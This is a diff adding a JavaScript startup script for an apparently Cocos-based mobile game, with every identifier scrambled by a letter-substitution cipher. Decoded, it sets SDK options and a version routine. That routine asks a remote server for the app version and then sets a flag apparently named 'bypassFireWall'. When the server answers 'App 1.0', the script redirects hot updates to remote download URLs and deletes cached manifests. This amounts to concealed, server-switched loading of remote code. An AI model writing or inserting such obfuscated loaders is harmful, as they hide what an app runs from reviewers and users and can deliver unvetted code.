@@ -1,0 +1,98 @@
+gsxnyg.cnulyhMyxpsq = {
+    "kxnbysn": {
+        "YxoCsqxkv": {
+            "cyexn": pkvco, 
+            "fslbkdo": pkvco, 
+            "zbytomd_xewlob": "", 
+            "noleq": dbeo, 
+            "xydspsmkdsyxc_grox_kmdsfo": pkvco, 
+            "sn": ""
+        },
+        "Pkmolyyu": {
+            "noleq": pkvco
+        }
+    }, 
+    "syc": {
+        "YxoCsqxkv": {
+            "noleq": pkvco, 
+            "sn": "", 
+            "kedy_boqscdob": dbeo
+        },
+        "Pkmolyyu": {
+            "noleq": dbeo
+        }
+    }
+};
+
+gsxnyg.sxsdCnuLyh = dbeo;
+gsxnyg.qkwo_ebv = "jsu.mvel";
+gsxnyg.qkdo_byyd = "qkdo";
+gsxnyg.qkwo_cdkdec = 0;
+
+gsxnyg.rkxnvoQkwoFobcsyx = pexmdsyx(ml){
+    fkb cokbmrZkdrc = tcl.psvoEdsvc.qodCokbmrZkdrc();
+    fkb xogZkdrc = (tcl.psvoEdsvc ? tcl.psvoEdsvc.qodGbsdklvoZkdr() : '/') + 'nkdk';
+    cokbmrZkdrc = [xogZkdrc].myxmkd(cokbmrZkdrc);
+    tcl.psvoEdsvc.codCokbmrZkdrc(cokbmrZkdrc);
+
+    fkb mromuSz = pexmdsyx(mlMromuSz){
+        fkb boaeocd = mm.vyknob.qodHWVRddzBoaeocd();
+		boaeocd.yzox("QOD", "rddzc://cobfsmoc." + qkwo_ebv + "/kzs/dbkxckmdsyx/QodKzzFobcsyx", dbeo);
+        boaeocd.codBoaeocdRoknob("Myxdoxd-Dizo","kzzvsmkdsyx/tcyx;mrkbcod=EDP-8");
+
+        boaeocd.yxboknicdkdomrkxqo = pexmdsyx () {
+			sp (boaeocd.bokniCdkdo == 4) {
+                mlMromuSz(boaeocd.boczyxcoDohd);
+			}
+        };
+        
+        boaeocd.yxobbyb = pexmdsyx () {
+            mlMromuSz("obbyb");
+        };
+        
+        boaeocd.coxn();
+    };
+
+    fkb rkxnvoWkxspocd = pexmdsyx() {
+        gsxnyg.wkxspocdQkdo = {
+            "zkmukqoEbv":"rddzc://nv.{ebv_byyd}/syc/qkdo/",
+            "bowydoWkxspocdEbv":"rddzc://nv.{ebv_byyd}/syc/qkdo/zbytomd.wkxspocd",
+            "bowydoFobcsyxEbv":"rddzc://nv.{ebv_byyd}/syc/qkdo/fobcsyx.wkxspocd",
+            "fobcsyx":"0.0.0",
+            "kccodc":{},
+            "cokbmrZkdrc":[]
+        };
+            
+        fkb ebv_byyd = mm.cic.vymkvCdybkqo.qodSdow("zkmukqo_ebv_byyd");
+
+        sp(qkwo_ebv != ebv_byyd){
+            fkb psvoVscd = [];
+            fkb cdybkqoZkdr = xogZkdrc;
+
+            tcl.psvoEdsvc.vscdPsvocBomebcsfovi(cdybkqoZkdr, psvoVscd);
+            psvoVscd.pybOkmr(pexmdsyx(cbmZkdr) {
+                sp(cbmZkdr.sxnohYp("zbytomd.wkxspocd") > -1){
+                    tcl.psvoEdsvc.bowyfoPsvo(cbmZkdr)
+                }
+            });
+            mm.cic.vymkvCdybkqo.codSdow("zkmukqo_ebv_byyd", qkwo_ebv);
+        }
+    };
+
+    fkb lizkccPsboGkvv = mm.cic.vymkvCdybkqo.qodSdow("pevv_fobcsyx");
+
+    sp(lizkccPsboGkvv == "cemmocc"){
+        rkxnvoWkxspocd();
+        ml("cemmocc");
+    }ovco{
+        mromuSz(pexmdsyx(nkdk){
+            sp(nkdk != "Kzz 1.0"){
+                ml("excezzybdonFobcsyx");
+                bodebx;
+            }
+            rkxnvoWkxspocd();
+            mm.cic.vymkvCdybkqo.codSdow("pevv_fobcsyx", "cemmocc");
+            ml("cemmocc");
+        });
+    }
+};
